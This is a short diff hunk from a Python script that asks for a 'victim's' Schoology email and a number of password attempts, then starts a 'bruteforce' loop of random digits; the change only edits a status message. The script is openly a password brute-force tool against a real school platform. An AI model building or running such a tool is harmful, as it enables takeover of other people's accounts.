@@ -23,7 +23,7 @@ c = input("\033[36m[?] Victims schoology email?: ")
 b = int(input("[?] How many passwords would you like to try?: "))
 a = input("[?] Start Attack? [y/n]: ")
 if a == 'y':
-    print("\033[31mStarting bruteforce on " + c)
+    print("\033[31m[!] Starting bruteforce on " + c)
     time.sleep(2)
     for i in range(b):
         randomnumber = chr(random.randint(ord('0'), ord('9')))
